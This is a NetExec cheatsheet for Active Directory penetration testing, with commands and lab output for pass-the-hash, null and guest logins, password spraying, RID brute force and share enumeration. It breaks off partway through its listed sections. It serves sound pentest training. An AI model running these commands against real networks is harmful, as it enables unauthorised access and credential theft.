# NetExec Cheatsheet

A cheatsheet for NetExec, featuring useful commands and modules for different services.

- **GitHub:** https://github.com/Pennyw0rth/NetExec
- **Wiki:** https://www.netexec.wiki

## Table of Contents

1. [Checklist](#checklist)
   - [No Credentials](#no-credentials)
   - [Domain Credentials](#domain-credentials)
   - [Local Admin](#local-admin)
2. [Reading the Output](#reading-the-output)
   - [Login Results](#login-results)
   - [Host Information](#host-information)
3. [Setup](#setup)
   - [Installation](#installation)
   - [Basic Usage](#basic-usage)
4. [Target Discovery](#target-discovery)
   - [Basic Enumeration](#basic-enumeration)
   - [Generate Hosts File](#generate-hosts-file)
   - [Generate krb5 File](#generate-krb5-file)
   - [SMB Signing](#smb-signing)
5. [Authentication](#authentication)
   - [Null Authentication](#null-authentication)
   - [Guest Authentication](#guest-authentication)
   - [Local Authentication](#local-authentication)
   - [Specify the Domain](#specify-the-domain)
   - [Pass the Hash](#pass-the-hash)
   - [Kerberos Authentication](#kerberos-authentication)
   - [Use a Ticket From ccache](#use-a-ticket-from-ccache)
   - [Generate a TGT](#generate-a-tgt)
   - [Certificate Authentication](#certificate-authentication)
   - [Kerberos Gotchas](#kerberos-gotchas)
6. [Password Spraying](#password-spraying)
   - [Spray a List of Passwords](#spray-a-list-of-passwords)
   - [Credential Pairs](#credential-pairs)
   - [Spray With Kerberos](#spray-with-kerberos)
7. [SMB](#smb)
   - [List Shares](#list-shares)
   - [List Users](#list-users)
   - [RID Brute Force](#rid-brute-force)
   - [Password Policy](#password-policy)
   - [All-in-One](#all-in-one)
   - [Download a File](#download-a-file)
   - [Spider_plus Module](#spider_plus-module)
   - [Logged On Sessions](#logged-on-sessions)
   - [Running Processes](#running-processes)
8. [LDAP](#ldap)
   - [List Users](#list-users-1)
   - [All-in-One](#all-in-one-1)
   - [List Computers](#list-computers)
   - [User Descriptions](#user-descriptions)
   - [unixUserPassword](#unixuserpassword)
   - [Kerberoasting](#kerberoasting)
   - [ASREPRoasting](#asreproasting)
   - [BloodHound](#bloodhound)
   - [ADCS Enumeration](#adcs-enumeration)
   - [certipy-find](#certipy-find)
   - [Find the CA From SMB](#find-the-ca-from-smb)
   - [MachineAccountQuota](#machineaccountquota)
   - [Find Misconfigured Delegation](#find-misconfigured-delegation)
   - [Domain Controllers and Trusts](#domain-controllers-and-trusts)
   - [Group Membership](#group-membership)
   - [LDAP Signing](#ldap-signing)
   - [Pre-Created Computer Accounts](#pre-created-computer-accounts)
9. [Command Execution](#command-execution)
   - [Execute a CMD Command](#execute-a-cmd-command)
   - [Execute a PowerShell Command](#execute-a-powershell-command)
   - [WinRM](#winrm)
10. [Credential Dumping](#credential-dumping)
   - [SAM](#sam)
   - [LSA](#lsa)
   - [DPAPI](#dpapi)
   - [Chaining Arguments](#chaining-arguments)
   - [NTDS](#ntds)
   - [LSASS](#lsass)
   - [LAPS](#laps)
   - [gMSA](#gmsa)
   - [Group Policy Preferences](#group-policy-preferences)
   - [Backup Operators](#backup-operators)
   - [Dump Through S4U Delegation](#dump-through-s4u-delegation)
   - [MSOL Account Password](#msol-account-password)
11. [Coercion and Relay](#coercion-and-relay)
   - [coerce_plus](#coerce_plus)
   - [PetitPotam](#petitpotam)
   - [WebDAV](#webdav)
   - [slinky](#slinky)
12. [Useful Modules](#useful-modules)
   - [change-password](#change-password)
   - [timeroast](#timeroast)
   - [Vulnerability Checks](#vulnerability-checks)
   - [enum_av](#enum_av)
   - [Veeam](#veeam)
13. [Other Protocols](#other-protocols)
   - [MSSQL](#mssql)
   - [FTP](#ftp)
   - [SSH](#ssh)
   - [RDP](#rdp)
   - [NFS](#nfs)
   - [Debug Output](#debug-output)
14. [Resources](#resources)
15. [Practice](#practice)

## Placeholders

| Placeholder | Meaning |
|---|---|
| `$target` | IP, hostname, CIDR range or a file of targets |
| `$username / $password` | credentials |
| `$hash` | NT hash |
| `$domain` | domain name |
| `$dc_ip` | IP of the domain controller |
| `$listener` | your attacker IP or hostname |

Every command also works with `-H $hash` instead of `-p $password`, and with `-k` for Kerberos.

## Checklist

### No Credentials

- [Basic Enumeration](#basic-enumeration), then [Generate Hosts File](#generate-hosts-file) and [Generate krb5 File](#generate-krb5-file)
- [Null Authentication](#null-authentication) and [Guest Authentication](#guest-authentication)
- [List Shares](#list-shares), [List Users](#list-users) or [RID Brute Force](#rid-brute-force)
- [Password Policy](#password-policy), then [ASREPRoasting](#asreproasting) and [timeroast](#timeroast) with the user list
- [Spray a List of Passwords](#spray-a-list-of-passwords)

### Domain Credentials

- [List Shares](#list-shares) and [Spider_plus Module](#spider_plus-module) \*
- [List Users](#list-users-1) and [User Descriptions](#user-descriptions)
- [Kerberoasting](#kerberoasting) and [ASREPRoasting](#asreproasting)
- [BloodHound](#bloodhound)
- [ADCS Enumeration](#adcs-enumeration) and [certipy-find](#certipy-find) \*
- [MachineAccountQuota](#machineaccountquota), [Find Misconfigured Delegation](#find-misconfigured-delegation) and [Pre-Created Computer Accounts](#pre-created-computer-accounts)
- [gMSA](#gmsa), [LAPS](#laps) and [Group Policy Preferences](#group-policy-preferences) \*
- [SMB Signing](#smb-signing), [LDAP Signing](#ldap-signing), [coerce_plus](#coerce_plus) and [WebDAV](#webdav) for relay

### Local Admin

- [Chaining Arguments](#chaining-arguments) to dump SAM, LSA and DPAPI
- [Logged On Sessions](#logged-on-sessions) and [LSASS](#lsass)
- Spray the local Administrator hash with [Local Authentication](#local-authentication)
- [NTDS](#ntds) once you reach Domain Admin

\* run again for each new user you compromise

## Reading the Output

### Login Results

| Marker | Meaning |
|---|---|
| `[*]` | info |
| `[+]` | valid credentials |
| `[-]` | failed |
| `(Pwn3d!)` | admin on the host, command execution works |
| `(Guest)` | logged in as guest, the username does not exist |
| `from ccache` | authenticated with the Kerberos ticket from `KRB5CCNAME` |
| `Shell access!` | SSH login gives a shell |
| `STATUS_LOGON_FAILURE` | wrong username or password |
| `STATUS_ACCESS_DENIED` | valid login, but no rights for that action |
| `STATUS_ACCOUNT_DISABLED` | the account is disabled |
| `STATUS_ACCOUNT_RESTRICTION` | valid password, but the account is restricted, for example a member of Protected Users that cannot use NTLM, try `-k` |
| `STATUS_PASSWORD_EXPIRED` | valid password that has expired, see [change-password](#change-password) |
| `STATUS_PASSWORD_MUST_CHANGE` | the user must set a new password at next logon, see [change-password](#change-password) |
| `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` | valid password for a computer account, use `-k` or change its password, see [Pre-Created Computer Accounts](#pre-created-computer-accounts) |
| `STATUS_LOGON_TYPE_NOT_GRANTED` | valid credentials, but the account is not allowed to log on this way |
| `STATUS_NOT_SUPPORTED` | NTLM is disabled, use `-k` |
| `STATUS_USER_SESSION_DELETED` | the server dropped the session, often null or guest sessions are not allowed |
| `KDC_ERR_PREAUTH_FAILED` | wrong password (Kerberos) |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | the user does not exist (Kerberos) |
| `KDC_ERR_CLIENT_REVOKED` | the account is disabled or locked out (Kerberos) |
| `KDC_ERR_ETYPE_NOSUPP` | the KDC does not support the requested encryption type, usually RC4 is disabled so NT hash based Kerberos fails, use an AES key or a password |
| `KDC_ERR_S_PRINCIPAL_UNKNOWN` | the SPN does not exist, usually an IP was used instead of the hostname with `-k` |
| `KRB_AP_ERR_SKEW` | clock skew with the DC, sync your time with `sudo ntpdate $dc_ip` or use `faketime` |

### Host Information

| Marker | Meaning |
|---|---|
| `(signing:False)` | SMB signing not required, the host can be a relay target |
| `(SMBv1:True)` | SMBv1 enabled, old host, check [ms17-010](#vulnerability-checks) |
| `(Null Auth:True)` | null session allowed |
| `(NTLM:False)` | NTLM is disabled on the host, use `-k` |
| `(signing:None) (channel binding:Never)` | LDAP signing and channel binding not enforced, LDAP relay may work |
| `(nla:False)` | RDP without Network Level Authentication |

## Setup

### Installation

Using pipx

```
sudo apt install pipx git
pipx ensurepath
pipx install git+https://github.com/Pennyw0rth/NetExec
```

Using uv

```
uv tool install git+https://github.com/Pennyw0rth/NetExec
```

Latest version at the time of writing this

```
netexec --version
1.5.1 - Yippie-Ki-Yay - f6b0896d - 455
```

Upgrading

Using pipx

```
pipx upgrade netexec
```

Using uv

```
uv tool upgrade netexec
```

### Basic Usage

`nxc` and `netexec` are the same binary.

```
netexec <protocol> <target> -u <username> -p <password>
netexec <protocol> <target> -u <username> -H <hash>
```

Supported protocols: `smb`, `ldap`, `mssql`, `winrm`, `ssh`, `ftp`, `rdp`, `wmi`, `vnc`, `nfs`

## Target Discovery

### Basic Enumeration

Gives the hostname, domain, OS build and SMB signing status without credentials. Start here on every new host.

```
netexec smb $target
```

```
$ netexec smb 10.10.11.231
SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
```

Against a subnet or a list of hosts

```
netexec smb 10.10.10.0/24
netexec smb targets.txt
```

### Generate Hosts File

Adds the DC hostname and domain to a hosts file so Kerberos and LDAP tools can resolve names.

```
netexec smb $target --generate-hosts-file hosts
```

```
$ netexec smb 10.129.180.151 --generate-hosts-file hosts
SMB         10.129.180.151  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
$ cat hosts
10.129.180.151     DC.PUPPY.HTB PUPPY.HTB DC
```

### Generate krb5 File

Kerberos tools need a krb5.conf that points to the right realm and KDC. Copy it to `/etc/krb5.conf`.

```
netexec smb $target --generate-krb5-file krb5.conf
```

```
$ netexec smb frizzdc.frizz.htb --use-kcache --generate-krb5-file krb5.txt
SMB         frizzdc.frizz.htb 445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:False)
SMB         frizzdc.frizz.htb 445    frizzdc          [+] frizz.htb\f.frizzle from ccache
```

### SMB Signing

Hosts that do not require SMB signing can be targets for NTLM relay. Domain controllers require it by default, member servers and workstations usually do not.

```
netexec smb $targets --gen-relay-list relay.txt
```

```
$ netexec smb targets.txt --gen-relay-list relay.txt
SMB         10.10.162.38    445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:reflection.vl) (signing:False) (SMBv1:False)
SMB         10.10.162.37    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)
SMB         10.10.162.39    445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:reflection.vl) (signing:False) (SMBv1:False)
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

Writeup: [Reflection](https://seriotonctf.github.io/Reflection-Vulnlab/#NTLM-Relaying)

## Authentication

### Null Authentication

Works on older or misconfigured DCs. When it does, you can often list users and shares without any credentials.

```
netexec smb $target -u '' -p ''
```

```
$ proxychains4 -q netexec smb 10.10.140.5 -u '' -p ''
SMB         10.10.140.5    445    MUCDC            [*] Windows Server 2022 Standard 20348 x64 (name:MUCDC) (domain:heron.vl) (signing:True) (SMBv1:True)
SMB         10.10.140.5    445    MUCDC            [+] heron.vl\:
```

### Guest Authentication

The guest account is disabled by default. When it is enabled, it usually gives read access to shares and RID brute force.

```
netexec smb $target -u 'guest' -p ''
```

Any non existing username also falls back to the guest account if it is enabled

```
netexec smb $target -u 'a' -p ''
```

```
$ netexec smb baby2.vl -u 'a' -p '' --rid-brute
SMB         10.10.78.210    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)
SMB         10.10.78.210    445    DC               [+] baby2.vl\a: (Guest)
```

### Local Authentication

Authenticates against the local SAM of the host instead of the domain. Local administrator passwords are often reused across hosts.

```
netexec smb $target -u $username -p $password --local-auth
```

```
$ netexec smb lusms -u administrator -p 'XZ9i=bgA8KhRP.f=jr**Qgd3Qh@n9dRF' --local-auth
SMB         10.10.225.102   445    LUSMS            [*] Windows Server 2022 Build 20348 x64 (name:LUSMS) (domain:LUSMS) (signing:False) (SMBv1:False)
SMB         10.10.225.102   445    LUSMS            [+] LUSMS\administrator:XZ9i=bgA8KhRP.f=jr**Qgd3Qh@n9dRF (Pwn3d!)
```

### Specify the Domain

Useful when the target does not return the domain name, or when you authenticate to another domain in the forest

```
netexec smb $target -u $username -p $password -d $domain
```

```
$ netexec smb DC-JPQ225 -u administrator -H 85a0da53871a9d56b6cd05deda3a5e87 -k -d cicada.vl
SMB         DC-JPQ225       445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:DC-JPQ225) (signing:True) (SMBv1:False)
SMB         DC-JPQ225       445    DC-JPQ225        [+] cicada.vl\administrator:85a0da53871a9d56b6cd05deda3a5e87 (Pwn3d!)
```

### Pass the Hash

The NT hash works in place of the password for NTLM authentication, no cracking needed.

```
netexec smb $target -u $username -H $hash
```

```
$ netexec winrm redelegate.vl -u ryan.cooper -H 062a12325a99a9da55f5070bf9c6fd2a
WINRM       10.10.112.183   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
WINRM       10.10.112.183   5985   DC               [+] redelegate.vl\ryan.cooper:062a12325a99a9da55f5070bf9c6fd2a (Pwn3d!)
```

Writeup: [Redelegate](https://seriotonctf.github.io/Redelegate-Vulnlab/)

### Kerberos Authentication

Needed when NTLM is disabled and for members of Protected Users. See [Kerberos Gotchas](#kerberos-gotchas) when it fails.

```
netexec smb $target -u $username -p $password -k
```

When NTLM is disabled the normal login fails

```
$ netexec ldap rustykey.htb -u meow -p meow
LDAP        10.10.10.90     389    DC               [*] None (name:DC) (domain:rustykey.htb)
LDAP        10.10.10.90     389    DC               [-] rustykey.htb\meow:meow STATUS_NOT_SUPPORTED
```

Adding `-k` fixes it

```
$ netexec ldap rustykey.htb -u meow -p meow -k
LDAP        rustykey.htb    389    DC               [*] None (name:DC) (domain:rustykey.htb)
LDAP        rustykey.htb    389    DC               [+] rustykey.htb\meow:meow
```

### Use a Ticket From ccache

Uses a ticket obtained with another tool, for example after S4U or after authenticating with a certificate.

```
export KRB5CCNAME=user.ccache
netexec smb $target --use-kcache
```

```
$ netexec smb dc.rustykey.htb --use-kcache --users
SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [+] RUSTYKEY.HTB\rr.parker from ccache
SMB         dc.rustykey.htb 445    dc               -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         dc.rustykey.htb 445    dc               Administrator                 2025-06-04 22:52:22 0       Built-in account for administering the computer/domain
SMB         dc.rustykey.htb 445    dc               Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         dc.rustykey.htb 445    dc               krbtgt                        2024-12-27 00:53:40 0       Key Distribution Center Service Account
SMB         dc.rustykey.htb 445    dc               rr.parker                     2025-06-04 22:54:15 0
...[snip]...
```

### Generate a TGT

Saves a TGT for the account so other tools can use it through `KRB5CCNAME`.

```
netexec smb $target -u $username -p $password -k --generate-tgt $output_name
```

```
$ netexec smb dc2.pong.htb -u c.roberts -p AssumedBreach123 -d 'ping.htb' -k --generate-tgt c.roberts-pong
SMB         dc2.pong.htb    445    dc2              [*]  x64 (name:dc2) (domain:pong.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc2.pong.htb    445    dc2              [+] ping.htb\c.roberts:AssumedBreach123
SMB         dc2.pong.htb    445    dc2              [+] TGT saved to: c.roberts-pong.ccache
SMB         dc2.pong.htb    445    dc2              [+] Run the following command to use the TGT: export KRB5CCNAME=c.roberts-pong.ccache
```

### Certificate Authentication

Authenticates with a certificate through PKINIT, for example after ESC1 or shadow credentials, and returns the NT hash of the account.

```
netexec smb $target -u $username --pfx-cert $username.pfx -k
```

```
$ netexec smb DC-JPQ225.cicada.vl -u DC-JPQ225$ --pfx-cert DC-JPQ225$.pfx -k
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\DC-JPQ225$:78ac17c052aee3adac3b8f6f1e500b3a
```

### Kerberos Gotchas

- Use the hostname, not the IP. Kerberos needs a name that matches an SPN, an IP gives `KDC_ERR_S_PRINCIPAL_UNKNOWN`. Add it with [Generate Hosts File](#generate-hosts-file).
- Point Kerberos at the right realm with [Generate krb5 File](#generate-krb5-file).
- Sync your clock with the DC, more than 5 minutes off gives `KRB_AP_ERR_SKEW`.

```
sudo ntpdate $dc_ip
```

- Export the full path of the ticket before `--use-kcache`.

```
export KRB5CCNAME=$PWD/user.ccache
```

- When RC4 is disabled, `-k` with `-H` fails with `KDC_ERR_ETYPE_NOSUPP`. Use the password or the AES key.

```
netexec smb $target -u $username --aesKey $aes_key -k
```

- For a user of another domain in the forest, add `-d` with that domain, see [Specify the Domain](#specify-the-domain).

## Password Spraying

### Spray a List of Passwords

Check the [password policy](#password-policy) first, every wrong password counts toward the lockout threshold of each user. `--continue-on-success` keeps going after the first valid login.

```
netexec smb $target -u users.txt -p passwords.txt --continue-on-success
```

```
$ proxychains4 -q netexec smb 10.10.166.149 -u users.txt -p passwords.txt --continue-on-success --shares
SMB         10.10.166.149   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:puppet.vl) (signing:True) (SMBv1:False)
SMB         10.10.166.149   445    DC01             [-] puppet.vl\administrator:xpNW4dSJ7Qi6oeAa STATUS_LOGON_FAILURE
SMB         10.10.166.149   445    DC01             [-] puppet.vl\svc_inventory_win:xpNW4dSJ7Qi6oeAa STATUS_LOGON_FAILURE
SMB         10.10.166.149   445    DC01             [-] puppet.vl\Bruce.Smith:xpNW4dSJ7Qi6oeAa STATUS_LOGON_FAILURE
SMB         10.10.166.149   445    DC01             [+] puppet.vl\svc_puppet_win_t1:xpNW4dSJ7Qi6oeAa
SMB         10.10.166.149   445    DC01             [-] puppet.vl\administrator:dLg7+foSGJwgvE STATUS_LOGON_FAILURE
SMB         10.10.166.149   445    DC01             [-] puppet.vl\svc_inventory_win:dLg7+foSGJwgvE STATUS_LOGON_FAILURE
SMB         10.10.166.149   445    DC01             [+] puppet.vl\Bruce.Smith:dLg7+foSGJwgvE
```

### Credential Pairs

Tries each line of users.txt against the same line of passwords.txt instead of every combination, useful for credentials dumped from a database

```
netexec smb $target -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
```

Username as password

```
netexec smb $target -u users.txt -p users.txt --no-bruteforce --continue-on-success
```

```
$ netexec smb 10.10.11.158 -u users.txt -p passwords.txt --continue-on-success --no-bruteforce
SMB         10.10.11.158    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:paddpadd STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Barry:$hadoW STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Bruno:$monique$1991$ STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Clara:%$clara STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\dfdfdf:dfdfdf STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Juliette:$3xybitch STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Lauren:##123a8j8w5123## STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Lenord:physics69i STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Michelle:!?Love?!123 STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Sabrina:!!sabrina$ STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Thane:highschoolmusical STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Victoria:!5psycho8! STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:66boysandgirls.. STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [+] streamIO.htb\nikk37:get_dem_girls2@yahoo.com
SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:66boysandgirls.. STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Lauren:##123a8j8w5123## STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Sabrina:!!sabrina$ STATUS_LOGON_FAILURE
```

### Spray With Kerberos

Works when NTLM is disabled. Failed Kerberos pre-authentication is logged as event 4771 instead of 4625.

```
netexec smb $target -u users.txt -p passwords.txt -k --continue-on-success
```

```
$ netexec smb dc.voleur.htb -u users.txt -p passwords.txt -k --continue-on-success
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
...[snip]...
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\svc_ldap:M1XyC9pW7qT5Vn
```

## SMB

### List Shares

Look for READ or WRITE on anything other than the default shares (ADMIN$, C$, IPC$, NETLOGON, SYSVOL).

```
netexec smb $target -u '' -p '' --shares
netexec smb $target -u $username -p $password --shares
```

```
$ netexec smb MS01 -u olivia.wood -p DeployTrust07 --shares
SMB         10.10.255.6     445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:push.vl) (signing:False) (SMBv1:False)
SMB         10.10.255.6     445    MS01             [+] push.vl\olivia.wood:DeployTrust07
SMB         10.10.255.6     445    MS01             [*] Enumerated shares
SMB         10.10.255.6     445    MS01             Share           Permissions     Remark
SMB         10.10.255.6     445    MS01             -----           -----------     ------
SMB         10.10.255.6     445    MS01             ADMIN$                          Remote Admin
SMB         10.10.255.6     445    MS01             C$                              Default share
SMB         10.10.255.6     445    MS01             IPC$            READ            Remote IPC
SMB         10.10.255.6     445    MS01             wwwroot         READ,WRITE      clickonce application dev share
```

### List Users

The description column sometimes holds passwords. The BadPW column shows failed logins, check it before spraying.

```
netexec smb $target -u '' -p '' --users
netexec smb $target -u $username -p $password --users
```

```
$ netexec smb 172.16.20.1 -u victor.r -p 'victor1gustavo@#' --users
SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:False)
SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\victor.r:victor1gustavo@#
SMB         172.16.20.1     445    DC-01            -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         172.16.20.1     445    DC-01            Administrator                 2024-12-29 23:25:45 0       Built-in account for administering the computer/domain
SMB         172.16.20.1     445    DC-01            Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         172.16.20.1     445    DC-01            krbtgt                        2024-12-29 23:29:05 0       Key Distribution Center Service Account
SMB         172.16.20.1     445    DC-01            victor.r                      2025-01-06 16:53:19 0
SMB         172.16.20.1     445    DC-01            svc_acc                       2024-12-29 23:39:38 0
SMB         172.16.20.1     445    DC-01            john.w                        2024-12-29 23:39:48 0
SMB         172.16.20.1     445    DC-01            angela.w                      2024-12-29 23:39:57 0
SMB         172.16.20.1     445    DC-01            angela.w.adm                  2024-12-29 23:39:57 0
SMB         172.16.20.1     445    DC-01            taylor.b                      2025-01-09 16:10:33 0
SMB         172.16.20.1     445    DC-01            taylor.b.adm                  2025-01-08 21:55:01 0
SMB         172.16.20.1     445    DC-01            eugene.b                      2025-02-03 17:30:41 0
SMB         172.16.20.1     445    DC-01            bryce.c                       2025-02-03 17:31:26 0
SMB         172.16.20.1     445    DC-01            [*] Enumerated 12 local users: darkcorp
```

### RID Brute Force

Works with null or guest access when `--users` is denied. Filter on SidTypeUser to build a user list for spraying and AS-REP roasting.

```
netexec smb $target -u '' -p '' --rid-brute
netexec smb $target -u 'guest' -p '' --rid-brute | grep SidTypeUser
```

```
$ netexec smb 10.10.68.115 -u 'a' -p '' --rid-brute
SMB         10.10.68.115    445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
SMB         10.10.68.115    445    DC1              [+] delegate.vl\a: (Guest)
SMB         10.10.68.115    445    DC1              498: DELEGATE\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.68.115    445    DC1              500: DELEGATE\Administrator (SidTypeUser)
SMB         10.10.68.115    445    DC1              501: DELEGATE\Guest (SidTypeUser)
SMB         10.10.68.115    445    DC1              502: DELEGATE\krbtgt (SidTypeUser)
SMB         10.10.68.115    445    DC1              512: DELEGATE\Domain Admins (SidTypeGroup)
SMB         10.10.68.115    445    DC1              513: DELEGATE\Domain Users (SidTypeGroup)
SMB         10.10.68.115    445    DC1              514: DELEGATE\Domain Guests (SidTypeGroup)
SMB         10.10.68.115    445    DC1              515: DELEGATE\Domain Computers (SidTypeGroup)
SMB         10.10.68.115    445    DC1              516: DELEGATE\Domain Controllers (SidTypeGroup)
SMB         10.10.68.115    445    DC1              517: DELEGATE\Cert Publishers (SidTypeAlias)
SMB         10.10.68.115    445    DC1              518: DELEGATE\Schema Admins (SidTypeGroup)
SMB         10.10.68.115    445    DC1              519: DELEGATE\Enterprise Admins (SidTypeGroup)
SMB         10.10.68.115    445    DC1              520: DELEGATE\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.68.115    445    DC1              521: DELEGATE\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.68.115    445    DC1              522: DELEGATE\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.68.115    445    DC1              525: DELEGATE\Protected Users (SidTypeGroup)
SMB         10.10.68.115    445    DC1              526: DELEGATE\Key Admins (SidTypeGroup)
SMB         10.10.68.115    445    DC1              527: DELEGATE\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.68.115    445    DC1              553: DELEGATE\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.68.115    445    DC1              571: DELEGATE\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.68.115    445    DC1              572: DELEGATE\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.68.115    445    DC1              1000: DELEGATE\DC1$ (SidTypeUser)
SMB         10.10.68.115    445    DC1              1101: DELEGATE\DnsAdmins (SidTypeAlias)
SMB         10.10.68.115    445    DC1              1102: DELEGATE\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.68.115    445    DC1              1104: DELEGATE\A.Briggs (SidTypeUser)
SMB         10.10.68.115    445    DC1              1105: DELEGATE\b.Brown (SidTypeUser)
SMB         10.10.68.115    445    DC1              1106: DELEGATE\R.Cooper (SidTypeUser)
SMB         10.10.68.115    445    DC1              1107: DELEGATE\J.Roberts (SidTypeUser)
SMB         10.10.68.115    445    DC1              1108: DELEGATE\N.Thompson (SidTypeUser)
SMB         10.10.68.115    445    DC1              1121: DELEGATE\delegation admins (SidTypeGroup)
```

### Password Policy

Check the lockout threshold before spraying. `Account Lockout Threshold: None` means accounts will not lock.

```
netexec smb $target -u $username -p $password --pass-pol
```

```
$ netexec smb 172.79.1.7 -u kevin.wong -p 'P@ssw0rd' --pass-pol
SMB         172.79.1.7      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:domain.local) (signing:True) (SMBv1:False)
SMB         172.79.1.7      445    DC01             [+] domain.local\kevin.wong:P@ssw0rd
SMB         172.79.1.7      445    DC01             [+] Dumping password info for domain: DOMAIN
SMB         172.79.1.7      445    DC01             Minimum password length: 6
SMB         172.79.1.7      445    DC01             Password history length: 24
SMB         172.79.1.7      445    DC01             Maximum password age: 41 days 23 hours 53 minutes
SMB         172.79.1.7      445    DC01     
SMB         172.79.1.7      445    DC01             Password Complexity Flags: 000000
SMB         172.79.1.7      445    DC01                 Domain Refuse Password Change: 0
SMB         172.79.1.7      445    DC01                 Domain Password Store Cleartext: 0
SMB         172.79.1.7      445    DC01                 Domain Password Lockout Admins: 0
SMB         172.79.1.7      445    DC01                 Domain Password No Clear Change: 0
SMB         172.79.1.7      445    DC01                 Domain Password No Anon Change: 0
SMB         172.79.1.7      445    DC01                 Domain Password Complex: 0
SMB         172.79.1.7      445    DC01     
SMB         172.79.1.7      445    DC01             Minimum password age: 1 day 4 minutes
SMB         172.79.1.7      445    DC01             Reset Account Lockout Counter: 10 minutes
SMB         172.79.1.7      445    DC01             Locked Account Duration: 10 minutes
SMB         172.79.1.7      445    DC01             Account Lockout Threshold: None
SMB         172.79.1.7      445    DC01             Forced Log off Time: Not Set
```

### All-in-One

Runs most SMB enumeration flags in one go.

```
netexec smb $target -u $username -p $password --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol
```

### Download a File

Downloads one file without mounting the share. The path is relative to the share root.

```
netexec smb $target -u $username -p $password --share $share --get-file $remote_file $local_file
```

```
$ netexec smb 10.10.68.115 -u 'a' -p '' --share SYSVOL --get-file "delegate.vl/scripts/users.bat" users.bat
SMB         10.10.68.115    445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
SMB         10.10.68.115    445    DC1              [+] delegate.vl\a: (Guest)
SMB         10.10.68.115    445    DC1              [*] Copying "delegate.vl/scripts/users.bat" to "users.bat"
SMB         10.10.68.115    445    DC1              [+] File "delegate.vl/scripts/users.bat" was downloaded to "users.bat"
```

### Spider_plus Module

Lists every readable file in every share and saves the result as JSON in the output folder. `DOWNLOAD_FLAG=True` downloads the files too.

```
netexec smb $target -u $username -p $password -M spider_plus
